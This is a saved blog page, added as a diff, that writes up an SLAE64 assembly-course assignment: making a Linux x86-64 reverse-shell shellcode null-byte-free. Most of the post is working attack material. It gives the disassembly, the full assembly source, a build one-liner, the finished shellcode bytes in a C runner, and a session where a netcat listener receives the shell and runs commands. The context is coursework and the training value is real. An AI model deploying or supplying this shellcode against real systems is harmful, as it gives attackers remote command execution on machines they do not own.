@@ -1,0 +1,197 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.0" /><meta property="og:title" content="SLAE64 - Assignment 2B - Null-Free Bind Reverse Shellcode" /><meta name="author" content="fwinsnes" /><meta property="og:locale" content="en" /><meta name="description" content="These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification." /><meta property="og:description" content="These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification." /><link rel="canonical" href="https://whitecr0wz.github.io/posts/SLAE64-Null-Free-Reverse/" /><meta property="og:url" content="https://whitecr0wz.github.io/posts/SLAE64-Null-Free-Reverse/" /><meta property="og:site_name" content="Knowledge Library" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-23T05:44:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="SLAE64 - Assignment 2B - Null-Free Bind Reverse Shellcode" /><meta name="twitter:site" content="@whitecr0wz" /><meta name="twitter:creator" content="@fwinsnes" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"fwinsnes"},"dateModified":"2021-01-23T05:44:00+00:00","datePublished":"2021-01-23T05:44:00+00:00","description":"These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification.","headline":"SLAE64 - Assignment 2B - Null-Free Bind Reverse Shellcode","mainEntityOfPage":{"@type":"WebPage","@id":"https://whitecr0wz.github.io/posts/SLAE64-Null-Free-Reverse/"},"url":"https://whitecr0wz.github.io/posts/SLAE64-Null-Free-Reverse/"}</script><title>SLAE64 - Assignment 2B - Null-Free Bind Reverse Shellcode | Knowledge Library</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Knowledge Library"><meta name="application-name" content="Knowledge Library"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://whitecr0wz.github.io/assets/img/Felipe-Winsnes.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Knowledge Library</a></div><div class="site-subtitle font-italic">Just sharing interesting tech stuff :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://twitter.com/whitecr0wz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>SLAE64 - Assignment 2B - Null-Free Bind Reverse Shellcode</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>SLAE64 - Assignment 2B - Null-Free Bind Reverse Shellcode</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1611380640" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 23, 2021 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Felipe Winsnes </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="877 words"> <em>4 min</em> read</span></div></div></div><div class="post-content"><p>These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification.</p><p>A Reverse shell is a form of malware which grants remote access to a system through a shell. However, it differentiates from its peer the Bind Shell, arranging a specific connection on a trivial address, instead of binding the compromised device into a certain port. Furthermore, after the connection is established, a shell is executed, granting interaction to the attacker.</p><p>The first assignment from the seven is divided in two sections:</p><ul><li>A: Requires the creation of a Reverse Shell with password protection through the Assembly language, and converting such into shellcode.<li>B: Requires the alteration of the provided Reverse Shell during the course, in order that it no longer possesses any form of NULL bytes (00).</ul><p>Due to the reason that in the <a href="https://whitecr0wz.github.io/posts/SLAE64-Reverse-Password/">previous</a> post the first section of the exercise was tackled, this post will be focused towards the secondary task.</p><p>Let’s analyze the Reverse Shell given during the course:</p><pre><code class="language-term">hitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B/og$ objdump -D 1.o -M intel 
+
+1.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 &lt;_start&gt;:
+   0:   b8 29 00 00 00          mov    eax,0x29
+   5:   bf 02 00 00 00          mov    edi,0x2
+   a:   be 01 00 00 00          mov    esi,0x1
+   f:   ba 00 00 00 00          mov    edx,0x0
+  14:   0f 05                   syscall 
+  16:   48 89 c7                mov    rdi,rax
+  19:   48 31 c0                xor    rax,rax
+  1c:   50                      push   rax
+  1d:   c7 44 24 fc 7f 00 00    mov    DWORD PTR [rsp-0x4],0x100007f
+  24:   01 
+  25:   66 c7 44 24 fa 11 5c    mov    WORD PTR [rsp-0x6],0x5c11
+  2c:   66 c7 44 24 f8 02 00    mov    WORD PTR [rsp-0x8],0x2
+  33:   48 83 ec 08             sub    rsp,0x8
+  37:   b8 2a 00 00 00          mov    eax,0x2a
+  3c:   48 89 e6                mov    rsi,rsp
+  3f:   ba 10 00 00 00          mov    edx,0x10
+  44:   0f 05                   syscall 
+  46:   b8 21 00 00 00          mov    eax,0x21
+  4b:   be 00 00 00 00          mov    esi,0x0
+  50:   0f 05                   syscall 
+  52:   b8 21 00 00 00          mov    eax,0x21
+  57:   be 01 00 00 00          mov    esi,0x1
+  5c:   0f 05                   syscall 
+  5e:   b8 21 00 00 00          mov    eax,0x21
+  63:   be 02 00 00 00          mov    esi,0x2
+  68:   0f 05                   syscall 
+  6a:   48 31 c0                xor    rax,rax
+  6d:   50                      push   rax
+  6e:   48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
+  75:   2f 73 68 
+  78:   53                      push   rbx
+  79:   48 89 e7                mov    rdi,rsp
+  7c:   50                      push   rax
+  7d:   48 89 e2                mov    rdx,rsp
+  80:   57                      push   rdi
+  81:   48 89 e6                mov    rsi,rsp
+  84:   48 83 c0 3b             add    rax,0x3b
+  88:   0f 05                   syscall 
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B/og$
+</code></pre><p>Similarly like in the prior Assignment, most of the NULL opcodes arise from MOV operations, moving small values into rather big registers (I.E performing a MOV operation against the value “1” into RSI). In order to prevent such values, Lower bit Registers can be used. For instance, instead of using RAX when incrementing the register, AL could be used instead, which performs the same operation, with no NULLs whatsoever. In addition, a similar operation could be incrementing the register by one.</p><p>Final code:</p><pre><code class="language-term">global _start
+
+
+_start:
+
+	; sock = socket(AF_INET, SOCK_STREAM, 0)
+	; AF_INET = 2
+	; SOCK_STREAM = 1
+	; syscall number 41
+
+
+        xor rax, rax
+        xor rdi, rdi
+        xor rsi, rsi
+        xor rdx, rdx
+
+	mov al, 41
+
+        inc rdi
+        inc rdi
+
+        inc rsi
+
+	syscall
+
+	; copy socket descriptor to rdi for future use
+
+	mov rdi, rax
+
+
+	; server.sin_family = AF_INET
+	; server.sin_port = htons(PORT)
+	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
+	; bzero(&amp;server.sin_zero, 8)
+
+	xor rdx, rdx
+        xor rbp, rbp
+
+        push word 0x2
+        pop bp
+
+	push rdx
+
+	mov dword [rsp-4], 0x0101017f
+	mov word [rsp-6], 0x5c11
+	mov word [rsp-8], bp
+	sub rsp, 8
+
+	; connect(sock, (struct sockaddr *)&amp;server, sockaddr_len)
+
+	mov al, 42
+	mov rsi, rsp
+	mov dl, 16
+	syscall
+
+
+        ; duplicate sockets
+
+        ; dup2 (new, old)
+
+	mov al, 33
+
+        xor rsi, rsi
+
+        syscall
+
+        mov al, 33
+
+        inc rsi
+
+        syscall
+
+        mov al, 33
+
+        inc rsi
+
+        syscall
+
+
+        ; execve
+
+        ; First NULL push
+
+        xor rax, rax
+        push rax
+
+        ; push /bin//sh in reverse
+
+        mov rbx, 0x68732f2f6e69622f
+        push rbx
+
+        ; store /bin//sh address in RDI
+
+        mov rdi, rsp
+
+        ; Second NULL push
+        push rax
+
+        ; set RDX
+        mov rdx, rsp
+
+
+        ; Push address of /bin//sh
+        push rdi
+
+        ; set RSI
+
+        mov rsi, rsp
+
+        ; Call the Execve syscall
+        add rax, 59
+        syscall
+</code></pre><p>Let’s assemble, link this and get its shellcode!</p><pre><code class="language-term">whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B$ nasm -f elf64 1.asm -o 1.o &amp;&amp; ld 1.o -o 1 &amp;&amp; for i in $(objdump -d 1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+</code></pre><h6 id="c-format">C format</h6><pre><code class="language-term">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+unsigned char code[] = \
+"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb0\x29\x48\xff\xc7\x48\xff\xc7\x48\xff\xc6\x0f\x05\x48\x89\xc7\x48\x31\xd2\x48\x31\xed\x66\x6a\x02\x66\x5d\x52\xc7\x44\x24\xfc
+\x7f\x01\x01\x01\x66\xc7\x44\x24\xfa\x11\x5c\x66\x89\x6c\x24\xf8\x48\x83\xec\x08\xb0\x2a\x48\x89\xe6\xb2\x10\x0f\x05\xb0\x21\x48\x31\xf6\x0f\x05\xb0\x21\x48\xff\xc6\x0f\x05\xb0\
+x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
+
+;
+
+main()
+{
+ 
+printf("Shellcode Length:  %d\n", (int)strlen(code));
+ 
+int (*ret)() = (int(*)())code;
+ 
+ret();
+ 
+}
+</code></pre><h4 id="endgame"><span class="mr-2">EndGame</span><a href="#endgame" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><pre><code class="language-term">whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B$ gcc reverse-null-free.c -o reverse-null-free -fno-stack-protector -z execstack -w 
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B$ ./reverse-null-free 
+Shellcode Length:  126
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+whitecr0wz@SLAE64:~$ nc -lvp 4444 
+listening on [any] 4444 ...
+connect to [127.1.1.1] from localhost [127.0.0.1] 40484
+id
+uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+pwd
+/home/whitecr0wz/assembly/assignments/Assignment_2/B
+python3 -c 'import pty;pty.spawn("/bin/bash")';
+whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_2/B$ id 
+id 
+uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_2/B$
+</code></pre><h3 id="code"><span class="mr-2">Code</span><a href="#code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online- courses/securitytube-linux-assembly-expert/</a></p><p>Student ID: SLAE64–27812/PA-27812</p><p>You can find all of the used resources within this post <a href="https://github.com/whitecr0wz/SLAE/tree/main/SLAE64/Assignment_2/B">here</a>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/slae64/'>SLAE64</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/assembly/" class="post-tag no-text-decoration" >assembly</a> <a href="/tags/shellcoding/" class="post-tag no-text-decoration" >shellcoding</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"></div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=SLAE64+-+Assignment+2B+-+Null-Free+Bind+Reverse+Shellcode+-+Knowledge+Library&url=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE64-Null-Free-Reverse%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=SLAE64+-+Assignment+2B+-+Null-Free+Bind+Reverse+Shellcode+-+Knowledge+Library&u=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE64-Null-Free-Reverse%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE64-Null-Free-Reverse%2F&text=SLAE64+-+Assignment+2B+-+Null-Free+Bind+Reverse+Shellcode+-+Knowledge+Library" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/VyOS-OSPF-I/">VyOS - OSPF Basic Network</a><li><a href="/posts/Alignments-on-windows-registers/">Alignments on Windows Registers</a><li><a href="/posts/Vulnserver-LTER/">Vulnserver LTER - SEH Extremely restricted character set</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/vulnerability/">vulnerability</a> <a class="post-tag" href="/tags/networking/">Networking</a> <a class="post-tag" href="/tags/vyos/">VyOS</a> <a class="post-tag" href="/tags/ospf/">OSPF</a> <a class="post-tag" href="/tags/routing/">Routing</a> <a class="post-tag" href="/tags/soho/">SOHO</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Alignments-on-windows-registers/"><div class="card-body"> <em class="small" data-ts="1612158240" data-df="ll" > Feb 1, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Alignments on Windows Registers</h3><div class="text-muted small"><p> Preamble Welcome once again to my website! Within this post, i will be introducing methods to align x86 registers on Windows, topic that was hard for me to find when starting regarding Binary Expl...</p></div></div></a></div><div class="card"> <a href="/posts/Vulnserver-LTER/"><div class="card-body"> <em class="small" data-ts="1612244640" data-df="ll" > Feb 2, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnserver LTER - SEH Extremely restricted character set</h3><div class="text-muted small"><p> Introduction Last time i blogged, we tackled aligning registers within windows exploit development. Today we will be seeing an example on the vulnerable server by stephen bradshaw, in which, a res...</p></div></div></a></div><div class="card"> <a href="/posts/Backdooring-PE/"><div class="card-body"> <em class="small" data-ts="1603172640" data-df="ll" > Oct 20, 2020 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Backdooring PE Files through Code Caves</h3><div class="text-muted small"><p> Introduction Building malware is a topic which has always been from great interest to me. However, injecting malicious code within benign software seems a very concerning yet engrossing concept. ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/SLAE64-Reverse-Password/" class="btn btn-outline-primary" prompt="Older"><p>SLAE64 - Assignment 2A - Password-Protected Reverse TCP Shellcode</p></a> <a href="/posts/SLAE64-Egghunter/" class="btn btn-outline-primary" prompt="Newer"><p>SLAE64 - Assignment 3 - Egghunter</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/whitecr0wz">Felipe Winsnes</a>.</p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/vulnerability/">vulnerability</a> <a class="post-tag" href="/tags/networking/">Networking</a> <a class="post-tag" href="/tags/vyos/">VyOS</a> <a class="post-tag" href="/tags/ospf/">OSPF</a> <a class="post-tag" href="/tags/routing/">Routing</a> <a class="post-tag" href="/tags/soho/">SOHO</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
